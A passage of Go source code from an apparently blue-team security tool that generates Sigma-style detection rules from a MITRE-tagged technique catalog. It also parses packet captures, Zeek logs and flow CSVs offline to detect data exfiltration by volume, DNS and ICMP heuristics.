	if strings.ContainsAny(s, ":#{}[],&*?|<>=!%@") || strings.Contains(s, "\\") || strings.Contains(s, "\"") || strings.Contains(s, "'") {
		return "'" + strings.ReplaceAll(s, "'", "''") + "'"
	}
	return s
}

// generateSigma turns catalog entries into Sigma-like detection rules.
// The output is a best-effort Sigma skeleton for blue-team use; markers
// become CommandLine regex conditions. It is a generator, not a validator.
func generateSigma() string {
	var b strings.Builder
	for _, e := range catalog {
		if len(e.Markers) == 0 {
			continue
		}
		b.WriteString("title: " + yamlEscape(APPNAME+" - "+e.Name) + "\n")
		b.WriteString("id: " + fingerprint("sigma", APPNAME, e.ID) + "\n")
		b.WriteString("status: experimental\n")
		b.WriteString("description: " + yamlEscape(e.Summary) + "\n")
		b.WriteString("references:\n")
		for _, r := range e.Refs {
			b.WriteString("  - " + yamlEscape(r) + "\n")
		}
		b.WriteString("author: khaled.s.haddad (owlsec.org)\n")
		b.WriteString("tags:\n")
		b.WriteString("  - attack." + tacticTag(e.Tactic) + "\n")
		if e.Technique != "" {
			b.WriteString("  - attack." + strings.ToLower(e.Technique) + "\n")
		}
		b.WriteString("logsource:\n")
		b.WriteString("  category: process_creation\n")
		b.WriteString("  product: " + yamlEscape(e.Platform) + "\n")
		b.WriteString("detection:\n")
		b.WriteString("  selection:\n")
		b.WriteString("    CommandLine|re:\n")
		for _, m := range e.Markers {
			b.WriteString("      - " + yamlEscape(m) + "\n")
		}
		b.WriteString("  condition: selection\n")
		b.WriteString("level: " + sigmaLevel(e.Severity) + "\n")
		b.WriteString("---\n")
	}
	return b.String()
}

var tacticIDs = map[string]string{"TA0001": "initial_access", "TA0002": "execution", "TA0003": "persistence",
	"TA0004": "privilege_escalation", "TA0005": "defense_evasion", "TA0006": "credential_access", "TA0007": "discovery",
	"TA0008": "lateral_movement", "TA0009": "collection", "TA0010": "exfiltration", "TA0011": "command_and_control",
	"TA0040": "impact", "TA0042": "resource_development", "TA0043": "reconnaissance"}

// tacticTag turns "TA0010" or "Command and Control" into a Sigma tactic tag.
func tacticTag(t string) string {
	if n, ok := tacticIDs[strings.ToUpper(strings.TrimSpace(t))]; ok {
		return n
	}
	return strings.ToLower(strings.ReplaceAll(strings.TrimSpace(t), " ", "_"))
}

func sigmaLevel(sev string) string {
	switch strings.ToLower(sev) {
	case "critical":
		return "critical"
	case "high":
		return "high"
	case "medium":
		return "medium"
	case "low":
		return "low"
	default:
		return "informational"
	}
}

// menuSigma shows generated Sigma rules and offers to export them.
func menuSigma() {
	clear()
	banner()
	sectionHeader("Detection Rules (Sigma-Style)")
	rules := generateSigma()
	count := strings.Count(rules, "---\n")
	info(fmt.Sprintf("Generated %d Sigma-style rule(s) from the catalog markers.", count))
	preview := rules
	if len(preview) > 1400 {
		preview = preview[:1400] + "\n... (truncated preview) ..."
	}
	fmt.Println(col(preview, GY))
	fmt.Println()
	if out := prompt("export to file? (path or blank)"); out != "" {
		if err := os.WriteFile(out, []byte(rules), 0644); err != nil {
			errMsg(err.Error())
		} else {
			okMsg("Wrote Sigma rules to " + out)
		}
	}
	pause()
}

// ====================================================================
//  TOOL-SPECIFIC EXTRA ENGINE
// ====================================================================

func menuShowMitre() {
	clear()
	banner()
	sectionHeader("MITRE Technique Index")
	by := map[string][]CatalogEntry{}
	for _, e := range catalog {
		by[e.Technique] = append(by[e.Technique], e)
	}
	var keys []string
	for k := range by {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	rows := [][]string{}
	for _, k := range keys {
		rows = append(rows, []string{k, strconv.Itoa(len(by[k])), trunc(by[k][0].Name, 40), by[k][0].Severity})
	}
	table([]string{"TECHNIQUE", "N", "EXAMPLE", "SEV"}, rows)
	pause()
}
func init() {
	planReportFn = func() Report {
		entries := append([]CatalogEntry{}, catalog...)
		sort.SliceStable(entries, func(i, j int) bool {
			return sevRank[strings.ToLower(entries[i].Severity)] > sevRank[strings.ToLower(entries[j].Severity)]
		})
		return buildReport("plan", "catalog", entriesToFindings(entries))
	}
}

// ====================================================================
//  DEMO SAMPLE + PLAN REPORT (hooks; tools may override planReportFn)
// ====================================================================

// planReportFn lets a tool supply a custom planner report for CLI --plan.
var planReportFn = defaultPlanReport

// planReport returns the planner report for the CLI --plan path.
func planReport() Report { return planReportFn() }

// defaultPlanReport ranks the catalog by severity into a plan report.
func defaultPlanReport() Report {
	entries := append([]CatalogEntry{}, catalog...)
	sort.SliceStable(entries, func(i, j int) bool {
		return sevRank[strings.ToLower(entries[i].Severity)] > sevRank[strings.ToLower(entries[j].Severity)]
	})
	return buildReport("plan", "catalog", entriesToFindings(entries))
}

func interactiveBrowse() {
	for {
		sel := strings.TrimLeft(menu("Catalog Browser", []menuItem{
			{"1", "List all", "every technique in the catalog", CY + B},
			{"2", "Search", "free-text search across entries", CY + B},
			{"3", "By category", "filter by category", CY + B},
			{"4", "By platform", "filter by platform", CY + B},
			{"5", "Show entry by ID", "full card for one technique", CY + B},
		}), "0")
		switch sel {
		case "1":
			clear()
			banner()
			printCatalogTable(catalog)
			pause()
		case "2":
			q := prompt("query")
			clear()
			banner()
			printCatalogTable(searchCatalog(q))
			pause()
		case "3":
			cats := categories()
			fmt.Println()
			for i, c := range cats {
				fmt.Printf("   %s %s\n", col(fmt.Sprintf("[%d]", i+1), CY+B), col(c, W))
			}
			idx := prompt("category #")
			if n, err := strconv.Atoi(idx); err == nil && n >= 1 && n <= len(cats) {
				clear()
				banner()
				printCatalogTable(filterByCategory(cats[n-1]))
				pause()
			}
		case "4":
			ps := platforms()
			fmt.Println()
			for i, p := range ps {
				fmt.Printf("   %s %s\n", col(fmt.Sprintf("[%d]", i+1), CY+B), col(p, W))
			}
			idx := prompt("platform #")
			if n, err := strconv.Atoi(idx); err == nil && n >= 1 && n <= len(ps) {
				clear()
				banner()
				printCatalogTable(filterByPlatform(ps[n-1]))
				pause()
			}
		case "5":
			id := prompt("entry ID")
			if e, ok := catalogByID(id); ok {
				clear()
				banner()
				showEntry(e)
			} else {
				errMsg("No entry with ID " + id)
			}
			pause()
		case "":
			return
		}
	}
}

func interactiveStats() {
	clear()
	banner()
	sectionHeader("Catalog Statistics")
	bySev := map[string]int{}
	byCat := map[string]int{}
	byPlat := map[string]int{}
	markerCount := 0
	for _, e := range catalog {
		bySev[strings.ToLower(e.Severity)]++
		byCat[e.Category]++
		byPlat[e.Platform]++
		markerCount += len(e.Markers)
	}
	info(fmt.Sprintf("Catalog entries : %d", len(catalog)))
	info(fmt.Sprintf("Scan markers    : %d", markerCount))
	info(fmt.Sprintf("Categories      : %d", len(byCat)))
	info(fmt.Sprintf("Platforms       : %d", len(byPlat)))
	fmt.Println()
	fmt.Println("  " + col("By severity:", CY+B))
	for _, s := range []string{"critical", "high", "medium", "low", "info"} {
		if bySev[s] > 0 {
			bar := strings.Repeat("█", bySev[s])
			fmt.Printf("    %-9s %s %d\n", s, col(bar, sevColor(s)), bySev[s])
		}
	}
	fmt.Println()
	fmt.Println("  " + col("By category:", CY+B))
	var cs []string
	for c := range byCat {
		cs = append(cs, c)
	}
	sort.Strings(cs)
	for _, c := range cs {
		fmt.Printf("    %-28s %d\n", c, byCat[c])
	}
}

// catalogAsFindings turns the catalog into findings for a reference dump.
func catalogAsFindings() []Finding {
	var fs []Finding
	for _, e := range catalog {
		fs = append(fs, Finding{
			RuleID:    e.ID,
			Title:     e.Name,
			Severity:  e.Severity,
			Score:     sevWeight[strings.ToLower(e.Severity)],
			Tactic:    e.Tactic,
			Technique: e.Technique,
			Detail:    e.Summary,
			Detection: strings.Join(e.Detection, "; "),
			Refs:      e.Refs,
			Fprint:    fingerprint(e.ID),
		})
	}
	return fs
}

// entriesToFindings converts catalog entries into findings for export.
func entriesToFindings(entries []CatalogEntry) []Finding {
	var fs []Finding
	for _, e := range entries {
		fs = append(fs, Finding{
			RuleID: e.ID, Title: e.Name, Severity: e.Severity,
			Score: sevWeight[strings.ToLower(e.Severity)], Tactic: e.Tactic,
			Technique: e.Technique, Detail: e.Summary,
			Detection: strings.Join(e.Detection, "; "), Refs: e.Refs,
			Fprint: fingerprint(e.ID),
		})
	}
	return fs
}

// printCatalogStatsText prints catalog stats as plain text (CLI).
func printCatalogStatsText() {
	bySev := map[string]int{}
	byCat := map[string]int{}
	markers := 0
	for _, e := range catalog {
		bySev[strings.ToLower(e.Severity)]++
		byCat[e.Category]++
		markers += len(e.Markers)
	}
	fmt.Printf("%s catalog: %d entries, %d markers, %d categories\n", APPNAME, len(catalog), markers, len(byCat))
	for _, s := range []string{"critical", "high", "medium", "low", "info"} {
		if bySev[s] > 0 {
			fmt.Printf("  %-9s %d\n", s, bySev[s])
		}
	}
	var cs []string
	for c := range byCat {
		cs = append(cs, c)
	}
	sort.Strings(cs)
	for _, c := range cs {
		fmt.Printf("  [cat] %-28s %d\n", c, byCat[c])
	}
}

// ====================================================================
//  TRAFFIC ENGINE — offline exfiltration detection
//  Inputs: pcap / pcapng, Zeek conn/dns/ssl/http logs (TSV or JSON),
//  generic flow CSV. Captures are only read — nothing is sent.
// ====================================================================

// tunables (CLI: --vol-high / --vol-med in MB)
var (
	volHigh int64 = 50 << 20 // one external destination receiving this much → HIGH
	volMed  int64 = 10 << 20 // … this much → MEDIUM
)

type session struct {
	ts, end      time.Time
	client       string
	server       string
	dport        int
	proto        string // tcp | udp
	out, in      int64  // payload bytes client→server / server→client
	name, method string // TLS SNI / HTTP Host / Zeek server_name, HTTP method
	uid          string // Zeek uid (joins ssl/http logs)
}

type dnsQ struct {
	ts     time.Time
	client string
	qname  string
	qtype  int
}

type icmpStat struct {
	src, dst     string
	count        int
	bytes        int64
	nonStd       int
	maxLen       int
	distinct     map[string]bool
	sample       []byte
	first, last  time.Time
	payloadKnown bool
}

type trafficData struct {
	sessions []session
	dns      []dnsQ
	icmp     map[string]*icmpStat
	sources  []string
	packets  int
	first    time.Time
	last     time.Time
	// Zeek joins
	zeekName   map[string]string
	zeekMethod map[string]string
}

func newTraffic() *trafficData {
	return &trafficData{icmp: map[string]*icmpStat{}, zeekName: map[string]string{}, zeekMethod: map[string]string{}}
}

func (td *trafficData) seen(t time.Time) {
	if t.IsZero() {
		return
	}
	if td.first.IsZero() || t.Before(td.first) {
		td.first = t
	}
	if t.After(td.last) {
		td.last = t
	}
}

// ---- address classes ----

var internalNets = func() []*net.IPNet {
	var out []*net.IPNet
	for _, c := range []string{"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8", "169.254.0.0/16",
		"100.64.0.0/10", "0.0.0.0/8", "224.0.0.0/4", "255.255.255.255/32", "::1/128", "fc00::/7", "fe80::/10", "ff00::/8"} {
		_, n, _ := net.ParseCIDR(c)
		out = append(out, n)
	}
	return out
}()

func isInternal(ip string) bool {
	p := net.ParseIP(ip)
	if p == nil {
		return false
	}
	for _, n := range internalNets {
		if n.Contains(p) {
			return true
		}
	}
	return false
}

// ---- capture reading ----

type capPkt struct {
	ts   time.Time
	link int
	data []byte
}

// readCapture parses classic pcap (both byte orders, µs/ns) and pcapng.
func readCapture(b []byte) ([]capPkt, error) {
	if len(b) < 24 {
		return nil, errors.New("file too small for a capture")
	}
	switch binary.LittleEndian.Uint32(b) {
	case 0xa1b2c3d4, 0xd4c3b2a1, 0xa1b23c4d, 0x4d3cb2a1:
		var bo binary.ByteOrder = binary.LittleEndian
		m := binary.LittleEndian.Uint32(b)
		if m == 0xd4c3b2a1 || m == 0x4d3cb2a1 {
			bo = binary.BigEndian
		}
		nano := m == 0xa1b23c4d || m == 0x4d3cb2a1
		link := int(bo.Uint32(b[20:]))
		var out []capPkt
		for off := 24; off+16 <= len(b); {
			sec, frac := bo.Uint32(b[off:]), bo.Uint32(b[off+4:])
			n := int(bo.Uint32(b[off+8:]))
			off += 16
			if n < 0 || off+n > len(b) {
				break
			}
			ns := int64(frac) * 1000
			if nano {
				ns = int64(frac)
			}
			out = append(out, capPkt{time.Unix(int64(sec), ns), link, b[off : off+n]})
			off += n
		}
		return out, nil
	case 0x0a0d0d0a:
		var out []capPkt
		var bo binary.ByteOrder = binary.LittleEndian
		var links []int
		var tsres []float64
		for off := 0; off+12 <= len(b); {
			if binary.LittleEndian.Uint32(b[off:]) == 0x0a0d0d0a {
				if binary.LittleEndian.Uint32(b[off+8:]) == 0x1a2b3c4d {
					bo = binary.LittleEndian
				} else {
					bo = binary.BigEndian
				}
				links, tsres = nil, nil
			}
			typ, blen := bo.Uint32(b[off:]), int(bo.Uint32(b[off+4:]))
			if blen < 12 || off+blen > len(b) {
				break
			}
			body := b[off+8 : off+blen-4]
			switch typ {
			case 1: // IDB
				if len(body) >= 8 {
					links = append(links, int(bo.Uint16(body)))
					res := 1e-6
					for o := 8; o+4 <= len(body); {
						code, l := bo.Uint16(body[o:]), int(bo.Uint16(body[o+2:]))
						if code == 0 || o+4+l > len(body) {
							break
						}
						if code == 9 && l >= 1 {
							v := body[o+4]
							if v&0x80 != 0 {
								res = math.Pow(2, -float64(v&0x7f))
							} else {
								res = math.Pow(10, -float64(v))
							}
						}
						o += 4 + (l+3)&^3
					}
					tsres = append(tsres, res)
				}
			case 6: // EPB
				if len(body) >= 20 {
					iface := int(bo.Uint32(body))
					ts := uint64(bo.Uint32(body[4:]))<<32 | uint64(bo.Uint32(body[8:]))
					cl := int(bo.Uint32(body[12:]))
					if iface < len(links) && 20+cl <= len(body) {
						secs := float64(ts) * tsres[iface]
						out = append(out, capPkt{time.Unix(0, int64(secs*1e9)), links[iface], body[20 : 20+cl]})
					}
				}
			case 3: // SPB
				if len(body) >= 4 && len(links) > 0 {
					out = append(out, capPkt{time.Time{}, links[0], body[4:]})
				}
			}
			off += blen
		}
		return out, nil
	}
	return nil, errors.New("not a pcap/pcapng file")
}

func isCapture(b []byte) bool {
	if len(b) < 4 {
		return false
	}
	switch binary.LittleEndian.Uint32(b) {
	case 0xa1b2c3d4, 0xd4c3b2a1, 0xa1b23c4d, 0x4d3cb2a1, 0x0a0d0d0a:
		return true
	}
	return false
}

// ipPacket strips the link layer. l4len is the transport length declared by
// the IP header, so byte accounting stays right on snaplen-truncated captures
// and TSO/GRO super-frames.
func ipPacket(link int, d []byte) (src, dst string, proto int, l4 []byte, l4len int, ok bool) {
	switch link {
	case 1: // Ethernet (+ VLAN tags)
		if len(d) < 14 {
			return
		}
		et, off := binary.BigEndian.Uint16(d[12:]), 14
		for (et == 0x8100 || et == 0x88a8) && len(d) >= off+4 {
			et, off = binary.BigEndian.Uint16(d[off+2:]), off+4
		}
		if et != 0x0800 && et != 0x86dd {
			return
		}
		d = d[off:]
	case 113: // Linux SLL
		if len(d) < 16 {
			return
		}
		d = d[16:]
	case 276: // Linux SLL2
		if len(d) < 20 {
			return
		}
		d = d[20:]
	case 0, 108: // BSD loopback / NULL
		if len(d) < 4 {
			return
		}
		d = d[4:]
	case 101, 12, 14, 228, 229: // raw IP
	default:
		return
	}
	if len(d) < 1 {
		return
	}
	switch d[0] >> 4 {
	case 4:
		ihl := int(d[0]&0x0f) * 4
		if len(d) < 20 || ihl < 20 || len(d) < ihl {
			return
		}
		if binary.BigEndian.Uint16(d[6:])&0x1fff != 0 {
			return // non-first fragment
		}
		tl := int(binary.BigEndian.Uint16(d[2:]))
		if tl == 0 { // TSO frames may carry 0
			tl = len(d)
		}
		if tl < ihl {
			return
		}
		end := tl
		if end > len(d) {
			end = len(d)
		}
		return net.IP(d[12:16]).String(), net.IP(d[16:20]).String(), int(d[9]), d[ihl:end], tl - ihl, true
	case 6:
		if len(d) < 40 {
			return
		}
		plen := int(binary.BigEndian.Uint16(d[4:]))
		nh, off := int(d[6]), 40
		for (nh == 0 || nh == 43 || nh == 60) && len(d) >= off+8 {
			nh, off = int(d[off]), off+8+int(d[off+1])*8
		}
		if off > len(d) {
			return
		}
		l := plen - (off - 40)
		if plen == 0 || l < 0 {
			l = len(d) - off
		}
		return net.IP(d[8:24]).String(), net.IP(d[24:40]).String(), nh, d[off:], l, true
	}
	return
}

// ---- protocol parsers ----

// parseClientHello returns the SNI. done=false means the hello is still
// incomplete and more client bytes are needed.
func parseClientHello(b []byte) (sni string, done bool) {
	var hs []byte
	for len(b) >= 5 && b[0] == 0x16 {
		l := int(binary.BigEndian.Uint16(b[3:]))
		if 5+l > len(b) {
			hs = append(hs, b[5:]...)
			break
		}
		hs = append(hs, b[5:5+l]...)
		b = b[5+l:]
	}
	if len(hs) < 4 || hs[0] != 1 {
		return "", true // not a ClientHello
	}
	hl := int(hs[1])<<16 | int(hs[2])<<8 | int(hs[3])
	if len(hs)-4 < hl {
		return "", false
	}
	body := hs[4 : 4+hl]
	p := 34
	if p+1 > len(body) {
		return "", true
	}
	p += 1 + int(body[p])
	if p+2 > len(body) {
		return "", true
	}
	p += 2 + int(binary.BigEndian.Uint16(body[p:]))
	if p+1 > len(body) {
		return "", true
	}
	p += 1 + int(body[p])
	if p+2 > len(body) {
		return "", true
	}
	end := p + 2 + int(binary.BigEndian.Uint16(body[p:]))
	p += 2
	if end > len(body) {
		end = len(body)
	}
	for p+4 <= end {
		typ, l := binary.BigEndian.Uint16(body[p:]), int(binary.BigEndian.Uint16(body[p+2:]))
		p += 4
		if p+l > end {
			break
		}
		if typ == 0 && l >= 5 {
			ext := body[p : p+l]
			if ext[2] == 0 {
				nl := int(binary.BigEndian.Uint16(ext[3:]))
				if 5+nl <= len(ext) {
					return strings.ToLower(string(ext[5 : 5+nl])), true
				}
			}
		}
		p += l
	}
	return "", true
}

var httpMethods = []string{"GET ", "POST ", "PUT ", "PATCH ", "DELETE ", "HEAD ", "OPTIONS ", "CONNECT "}

// parseHTTPRequest returns method and Host of a plaintext request head.
func parseHTTPRequest(b []byte) (method, host string, done bool) {
	s := string(b)
	for _, m := range httpMethods {
		if strings.HasPrefix(s, m) {
			method = strings.TrimSpace(m)
			break
		}
	}
	if method == "" {
		return "", "", true
	}
	head := s
	if i := strings.Index(s, "\r\n\r\n"); i >= 0 {
		head = s[:i]
	} else if len(b) < 4096 {
		return method, "", false
	}
	for _, ln := range strings.Split(head, "\r\n") {
		if k, v, ok := strings.Cut(ln, ":"); ok && strings.EqualFold(strings.TrimSpace(k), "host") {
			host = strings.ToLower(strings.TrimSpace(v))
		}
	}
	return method, host, true
}

func readDNSName(b []byte, off int) (string, int, error) {
	var labels []string
	end, hops := -1, 0
	for {
		if off >= len(b) {
			return "", 0, errors.New("truncated name")
		}
		l := int(b[off])
		switch {
		case l == 0:
			if end < 0 {
				end = off + 1
			}
			return strings.Join(labels, "."), end, nil
		case l&0xc0 == 0xc0:
			if off+1 >= len(b) || hops > 30 {
				return "", 0, errors.New("bad compression pointer")
			}
			if end < 0 {
				end = off + 2
			}
			off = int(binary.BigEndian.Uint16(b[off:]) & 0x3fff)
			hops++
		default:
			if off+1+l > len(b) {
				return "", 0, errors.New("label overflow")
			}
			labels = append(labels, string(b[off+1:off+1+l]))
			off += 1 + l
		}
	}
}

// parseDNSQuery returns the question of a standard DNS query (not responses).
func parseDNSQuery(b []byte) (string, int, bool) {
	if len(b) < 12 || b[2]&0x80 != 0 || (b[2]>>3)&0x0f != 0 || binary.BigEndian.Uint16(b[4:]) < 1 {
		return "", 0, false
	}
	name, off, err := readDNSName(b, 12)
	if err != nil || off+4 > len(b) {
		return "", 0, false
	}
	return strings.ToLower(strings.TrimSuffix(name, ".")), int(binary.BigEndian.Uint16(b[off:])), true
}

// standardPing reports payloads produced by stock ping tools: Linux/BSD
// (timestamp + 0x10,0x11,… pattern), Windows ("abcdefghijklmnopqrstuvwabcdefghi"),
// or all-zero / repeated-byte fill.
func standardPing(p []byte) bool {
	if len(p) <= 16 {
		return true
	}
	win := "abcdefghijklmnopqrstuvw"
	isWin := true
	for i, c := range p {
		if c != win[i%len(win)] {
			isWin = false
			break
		}
	}
	if isWin {
		return true
	}
	for _, start := range []int{8, 16} {
		if len(p) > start {
			inc := true
			for i := start; i < len(p); i++ {
				if p[i] != byte(i) {
					inc = false
					break
				}
			}
			if inc {
				return true
			}
		}
	}
	same := true
	for _, c := range p[8:] {
		if c != p[8] {
			same = false
			break
		}
	}
	return same
}

var wellKnownPorts = map[int]bool{20: true, 21: true, 22: true, 23: true, 25: true, 53: true, 69: true, 80: true,
	110: true, 123: true, 143: true, 389: true, 443: true, 445: true, 465: true, 587: true, 636: true, 873: true,
	993: true, 995: true, 1194: true, 1433: true, 3306: true, 3389: true, 5432: true, 5900: true, 6379: true,
	8080: true, 8443: true, 9000: true, 27017: true}

// serverSide guesses which endpoint is the server when the handshake was not captured.
func serverSide(sp, dp int) bool { // true → dst is server
	if wellKnownPorts[dp] && !wellKnownPorts[sp] {
		return true
	}
	if wellKnownPorts[sp] && !wellKnownPorts[dp] {
		return false
	}
	return dp < sp
}

type tcpState struct {
	s      *session
	cport  int
	buf    []byte
	parsed bool
}

// ParseCapture loads packets into sessions, DNS queries and ICMP stats.
func (td *trafficData) ParseCapture(name string, b []byte) error {
	pkts, err := readCapture(b)
	if err != nil {
		return err
	}
	td.sources = append(td.sources, name)
	tcp := map[string]*tcpState{}
	udp := map[string]*session{}
	var order []*session
	for _, p := range pkts {
		src, dst, proto, l4, l4len, ok := ipPacket(p.link, p.data)
		if !ok {
			continue
		}
		td.packets++
		td.seen(p.ts)
		switch proto {
		case 6:
			if len(l4) < 20 {
				continue
			}
			sp, dp := int(binary.BigEndian.Uint16(l4)), int(binary.BigEndian.Uint16(l4[2:]))
			doff := int(l4[12]>>4) * 4
			flags := l4[13]
			plen := l4len - doff
			if plen < 0 {
				plen = 0
			}
			var data []byte
			if doff <= len(l4) {
				data = l4[doff:]
			}
			a, bb := src+":"+strconv.Itoa(sp), dst+":"+strconv.Itoa(dp)
			key := a + "|" + bb
			if bb < a {
				key = bb + "|" + a
			}
			st := tcp[key]
			syn, ack := flags&0x02 != 0, flags&0x10 != 0
			if st == nil {
				s := &session{ts: p.ts, proto: "tcp"}
				toDst := serverSide(sp, dp)
				if syn {
					toDst = !ack
				}
				if toDst {
					s.client, s.server, s.dport = src, dst, dp
					st = &tcpState{s: s, cport: sp}
				} else {
					s.client, s.server, s.dport = dst, src, sp
					st = &tcpState{s: s, cport: dp}
				}
				tcp[key] = st
				order = append(order, s)
			}
			s := st.s
			if p.ts.After(s.end) {
				s.end = p.ts
			}
			if src == s.client && sp == st.cport {
				s.out += int64(plen)
				if !st.parsed && len(data) > 0 && len(st.buf) < 16384 {
					st.buf = append(st.buf, data...)
					st.parse()
				}
			} else {
				s.in += int64(plen)
			}
		case 17:
			if len(l4) < 8 {
				continue
			}
			sp, dp := int(binary.BigEndian.Uint16(l4)), int(binary.BigEndian.Uint16(l4[2:]))
			plen := l4len - 8
			if dp == 53 || dp == 5353 {
				if q, t, ok := parseDNSQuery(l4[8:]); ok {
					td.dns = append(td.dns, dnsQ{p.ts, src, q, t})
				}
				continue
			}
			if sp == 53 || sp == 5353 {
				continue
			}
			a, bb := src+":"+strconv.Itoa(sp), dst+":"+strconv.Itoa(dp)
			key := a + "|" + bb
			if bb < a {
				key = bb + "|" + a
			}
			s := udp[key]
			if s == nil {
				s = &session{ts: p.ts, proto: "udp"}
				if serverSide(sp, dp) {
					s.client, s.server, s.dport = src, dst, dp
				} else {
					s.client, s.server, s.dport = dst, src, sp
				}
				udp[key] = s
				order = append(order, s)
			}
			if p.ts.After(s.end) {
				s.end = p.ts
			}
			if src == s.client {
				s.out += int64(plen)
			} else {
				s.in += int64(plen)
			}
		case 1, 58:
			if len(l4) < 8 {
				continue
			}
			if !(proto == 1 && l4[0] == 8 || proto == 58 && l4[0] == 128) {
				continue // echo requests only
			}
			td.addICMP(src, dst, p.ts, l4[8:], l4len-8)
		}
	}
	for _, s := range order {
		td.sessions = append(td.sessions, *s)
	}
	return nil
}

func (st *tcpState) parse() {
	b := st.buf
	switch {
	case len(b) >= 1 && b[0] == 0x16:
		if sni, done := parseClientHello(b); done {
			st.s.name, st.parsed = sni, true
		}
	case len(b) >= 4:
		m, h, done := parseHTTPRequest(b)
		if done {
			st.s.method, st.s.name, st.parsed = m, h, true
		}
	}
	if st.parsed || len(st.buf) >= 16384 {
		st.parsed, st.buf = true, nil
	}
}

func (td *trafficData) addICMP(src, dst string, ts time.Time, payload []byte, plen int) {
	k := src + ">" + dst
	st := td.icmp[k]
	if st == nil {
		st = &icmpStat{src: src, dst: dst, distinct: map[string]bool{}, first: ts, payloadKnown: true}
		td.icmp[k] = st
	}
	st.count++
	st.bytes += int64(plen)
	st.last = ts
	if plen > st.maxLen {
		st.maxLen = plen
	}
	if !standardPing(payload) {
		st.nonStd++
	}
	if len(st.distinct) < 4096 {
		h := sha256.Sum256(payload)
		st.distinct[string(h[:8])] = true
	}
	if len(st.sample) < 65536 {
		st.sample = append(st.sample, payload...)
	}
}

// ---- Zeek logs + flow CSV ----

func parseTime(s string) time.Time {
	s = strings.TrimSpace(s)
	if f, err := strconv.ParseFloat(s, 64); err == nil && f > 1e8 {
		sec := math.Floor(f)
		if f > 1e12 { // milliseconds
			return time.UnixMilli(int64(f))
		}
		return time.Unix(int64(sec), int64((f-sec)*1e9))
	}
	for _, l := range []string{time.RFC3339Nano, "2006-01-02T15:04:05", "2006-01-02 15:04:05", "2006-01-02T15:04:05.000000Z"} {
		if t, err := time.Parse(l, s); err == nil {
			return t
		}
	}
	return time.Time{}
}

func atoi64(s string) int64 {
	v, _ := strconv.ParseInt(strings.TrimSpace(s), 10, 64)
	if v < 0 {
		return 0
	}
	return v
}

// isZeek detects Zeek TSV (#fields header) or Zeek-style JSON lines.
func isZeek(text string) bool {
	if strings.HasPrefix(text, "#separator") || strings.Contains(text[:min(len(text), 4096)], "\n#fields\t") {
		return true
	}
	t := strings.TrimSpace(text)
	return strings.HasPrefix(t, "{") && strings.Contains(t[:min(len(t), 2048)], `"id.orig_h"`)
}

// ParseZeek reads conn / dns / ssl / http logs. Rows are maps keyed by field.
func (td *trafficData) ParseZeek(name, text string) error {
	td.sources = append(td.sources, name)
	var fields []string
	sep := "\t"
	for _, ln := range strings.Split(text, "\n") {
		ln = strings.TrimRight(ln, "\r")
		if ln == "" {
			continue
		}
		var row map[string]string
		switch {
		case strings.HasPrefix(ln, "#separator"):
			if v := strings.TrimSpace(strings.TrimPrefix(ln, "#separator")); strings.HasPrefix(v, `\x`) {
				if c, err := strconv.ParseUint(v[2:], 16, 8); err == nil {
					sep = string(rune(c))
				}
			}
			continue
		case strings.HasPrefix(ln, "#fields"):
			fields = strings.Split(ln, sep)[1:]
			continue
		case strings.HasPrefix(ln, "#"):
			continue
		case strings.HasPrefix(ln, "{"):
			var m map[string]any
			if json.Unmarshal([]byte(ln), &m) != nil {
				continue
			}
			row = map[string]string{}
			for k, v := range m {
				switch x := v.(type) {
				case string:
					row[k] = x
				case float64:
					row[k] = strconv.FormatFloat(x, 'f', -1, 64)
				}
			}
		default:
			if fields == nil {
				continue
			}
			vals := strings.Split(ln, sep)
			row = map[string]string{}
			for i, f := range fields {
				if i < len(vals) && vals[i] != "-" && vals[i] != "(empty)" {
					row[f] = vals[i]
				}
			}
		}
		td.zeekRow(row)
	}
	return nil
}

func (td *trafficData) zeekRow(r map[string]string) {
	ts := parseTime(r["ts"])
	td.seen(ts)
	switch {
	case r["query"] != "": // dns.log
		qt, _ := strconv.Atoi(r["qtype"])
		if qt == 0 {
			qt = map[string]int{"TXT": 16, "NULL": 10, "A": 1, "AAAA": 28, "CNAME": 5, "MX": 15}[r["qtype_name"]]
		}
		td.dns = append(td.dns, dnsQ{ts, r["id.orig_h"], strings.ToLower(strings.TrimSuffix(r["query"], ".")), qt})
	case r["server_name"] != "" && r["uid"] != "": // ssl.log
		td.zeekName[r["uid"]] = strings.ToLower(r["server_name"])
	case r["method"] != "" && r["uid"] != "": // http.log
		td.zeekMethod[r["uid"]] = r["method"]
		if h := r["host"]; h != "" {
			if _, ok := td.zeekName[r["uid"]]; !ok {
				td.zeekName[r["uid"]] = strings.ToLower(h)
			}
		}
	case r["id.orig_h"] != "" && r["proto"] != "": // conn.log
		dport, _ := strconv.Atoi(r["id.resp_p"])
		out, in := atoi64(r["orig_bytes"]), atoi64(r["resp_bytes"])
		if r["proto"] == "icmp" {
			if r["id.orig_p"] == "8" || r["id.orig_p"] == "128" { // echo request type
				k := r["id.orig_h"] + ">" + r["id.resp_h"]
				st := td.icmp[k]
				if st == nil {
					st = &icmpStat{src: r["id.orig_h"], dst: r["id.resp_h"], distinct: map[string]bool{}, first: ts}
					td.icmp[k] = st
				}
				n := int(atoi64(r["orig_pkts"]))
				if n == 0 {
					n = 1
				}
				st.count += n
				st.bytes += out
				st.last = ts
				if per := int(out) / n; per > st.maxLen {
					st.maxLen = per
				}
			}
			return
		}
		dur, _ := strconv.ParseFloat(r["duration"], 64)
		td.sessions = append(td.sessions, session{ts: ts, end: ts.Add(time.Duration(dur * float64(time.Second))),
			client: r["id.orig_h"], server: r["id.resp_h"], dport: dport, proto: r["proto"], out: out, in: in, uid: r["uid"]})
	}
}

// csvAliases maps generic flow-export headers to the fields we need.
var csvAliases = map[string][]string{
	"src":   {"src", "src_ip", "source", "source_ip", "srcaddr", "client", "orig_h", "id.orig_h", "src_addr"},
	"dst":   {"dst", "dst_ip", "dest", "destination", "destination_ip", "dstaddr", "server", "resp_h", "id.resp_h", "dst_addr"},
	"dport": {"dport", "dst_port", "dest_port", "destination_port", "dstport", "resp_p", "id.resp_p", "port"},
	"out":   {"bytes_out", "out_bytes", "orig_bytes", "sent_bytes", "bytes_sent", "tx_bytes", "src_bytes", "upload"},
	"in":    {"bytes_in", "in_bytes", "resp_bytes", "recv_bytes", "bytes_received", "rx_bytes", "dst_bytes", "download"},
	"ts":    {"ts", "time", "timestamp", "start", "start_time", "first_seen", "date"},
	"proto": {"proto", "protocol", "transport"},
